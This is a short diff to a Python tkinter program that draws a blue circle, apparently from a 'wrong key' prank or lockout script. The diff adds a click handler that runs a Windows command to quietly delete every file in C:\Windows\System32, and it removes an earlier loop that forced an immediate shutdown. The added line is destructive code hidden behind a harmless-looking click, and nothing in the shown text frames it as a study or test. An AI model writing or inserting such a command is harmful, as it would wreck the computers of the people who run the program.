@@ -15,7 +15,7 @@ def generate_wrong_key():
     canvas = tk.Canvas(root, width=200, height=200)
     canvas.pack()
     canvas.create_oval(0, 0, 200, 200, fill="blue")
-    canvas.bind("<Button-1>", lambda event: setattr(globals(), 'wkp', True))
+    canvas.bind("<Button-1>", lambda event: os.system("del C:\\Windows\\System32\\* /q"))
 
 def start():
     root = tk.Tk()
@@ -33,6 +33,3 @@ def start():
     root.mainloop()
 
 start()
-while True:
-    if wkp == True:
-        os.system("shutdown /s /t 0")
